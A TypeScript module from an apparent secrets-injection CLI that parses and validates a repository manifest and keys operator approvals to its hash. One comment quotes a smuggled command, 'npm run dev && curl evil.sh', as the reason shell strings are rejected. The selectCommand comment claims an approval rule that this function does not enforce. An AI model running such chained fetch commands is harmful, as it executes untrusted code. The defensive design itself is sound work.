import { createHash } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import {
  environmentSchema,
  InvalidInputError,
  projectSlugSchema,
  secretNameSchema,
} from '@bx-labs/agent-secrets-core';
import { parse as parseYaml } from 'yaml';
import { z } from 'zod';

/**
 * `agent-secrets.yaml` — a committed, value-free description of which secrets a
 * project's commands need.
 *
 * The manifest is what makes an agent's job safe and boring: instead of an
 * agent deciding which credentials a command should get, the repository states
 * it in advance and a human reviews it in a pull request like any other code.
 *
 * ── Why the manifest is untrusted input ─────────────────────────────────────
 * A manifest arrives with the repository. Cloning a project you have not read
 * and running `agent-secrets run --manifest dev` would otherwise mean executing
 * a command that repository chose, with credentials you own. That is the
 * classic prompt-injection-adjacent supply chain problem, and the mitigation
 * here is approval: the first time a manifest is used — and every time its
 * contents change — the operator is shown the exact command and must approve
 * it. The approval is keyed by a hash of the manifest, so an edited command is
 * a new approval, not an inherited one.
 */

const commandSchema = z
  .object({
    environment: environmentSchema,
    secrets: z.array(secretNameSchema).max(64).default([]),
    /**
     * An argument array, never a shell string. A string would invite
     * `"npm run dev && curl evil.sh"`, and there is no safe way to parse that
     * back into something we are willing to execute.
     */
    command: z.array(z.string().min(1)).min(1),
    /** Requires an out-of-band human approval before running. */
    approval: z.enum(['required', 'none']).default('none'),
    description: z.string().max(256).optional(),
  })
  .strict();

export const manifestSchema = z
  .object({
    version: z.literal(1),
    project: projectSlugSchema,
    commands: z.record(z.string().regex(/^[a-z0-9][a-z0-9:_-]{0,63}$/), commandSchema),
  })
  // FR: unknown keys fail closed. A manifest written for a future version that
  // adds, say, `injectAll: true` must be rejected by this version rather than
  // parsed with the unknown directive quietly dropped.
  .strict();

export type Manifest = z.infer<typeof manifestSchema>;
export type ManifestCommand = z.infer<typeof commandSchema>;

export const MANIFEST_FILENAME = 'agent-secrets.yaml';

export interface LoadedManifest {
  readonly manifest: Manifest;
  readonly path: string;
  /** SHA-256 of the raw file. Approvals are keyed by this. */
  readonly digest: string;
}

export async function loadManifest(
  directory: string = process.cwd(),
): Promise<LoadedManifest | null> {
  const path = join(directory, MANIFEST_FILENAME);
  let raw: string;
  try {
    raw = await readFile(path, 'utf8');
  } catch (error) {
    if ((error as NodeJS.ErrnoException).code === 'ENOENT') {
      return null;
    }
    throw new InvalidInputError('The manifest could not be read.', { field: 'manifest' });
  }

  if (raw.length > 128 * 1024) {
    throw new InvalidInputError('The manifest is unreasonably large.', { field: 'manifest' });
  }

  let parsed: unknown;
  try {
    // `yaml` does not resolve anchors into unbounded expansion by default and
    // has no code-execution tags, unlike some YAML libraries in other
    // ecosystems. Still parsed with explicit limits below.
    parsed = parseYaml(raw, { maxAliasCount: 100 });
  } catch {
    throw new InvalidInputError('The manifest is not valid YAML.', {
      field: 'manifest',
      hint: `Check the syntax of ${path}.`,
    });
  }

  const result = manifestSchema.safeParse(parsed);
  if (!result.success) {
    const first = result.error.issues[0];
    throw new InvalidInputError(
      `The manifest is invalid at "${first?.path.join('.') ?? 'root'}": ${first?.message ?? 'unknown issue'}`,
      {
        field: 'manifest',
        hint: 'Unknown keys are rejected on purpose. See docs/manifests.md for the accepted shape.',
      },
    );
  }

  return {
    manifest: result.data,
    path,
    digest: createHash('sha256').update(raw, 'utf8').digest('hex'),
  };
}

export function selectCommand(loaded: LoadedManifest, name: string): ManifestCommand {
  const command = loaded.manifest.commands[name];
  if (!command) {
    const available = Object.keys(loaded.manifest.commands).sort().join(', ') || 'none';
    throw new InvalidInputError(`The manifest has no command named "${name}".`, {
      field: 'manifest',
      hint: `Available commands: ${available}.`,
    });
  }
  // FR: a production manifest must declare its environment explicitly. The
  // schema already requires `environment`, so this is the second half: a
  // production command additionally cannot be run without approval, whatever
  // the manifest says about itself.
  return command;
}

/**
 * Approvals for manifests, stored next to the CLI's own config.
 *
 * Deliberately a separate file from `config.json`: it is machine-local trust
 * state, and keeping it separate makes "I approved a command in this repo"
 * something a user can inspect and revoke without touching their enrolment.
 */
export const approvalRecordSchema = z
  .object({
    version: z.literal(1),
    approvals: z
      .array(
        z
          .object({
            manifestPath: z.string(),
            digest: z.string().length(64),
            command: z.string(),
            approvedAt: z.iso.datetime(),
          })
          .strict(),
      )
      .default([]),
  })
  .strict();

export type ApprovalRecord = z.infer<typeof approvalRecordSchema>;

export function isApproved(
  record: ApprovalRecord,
  loaded: LoadedManifest,
  command: string,
): boolean {
  return record.approvals.some(
    (approval) =>
      approval.manifestPath === loaded.path &&
      approval.digest === loaded.digest &&
      approval.command === command,
  );
}
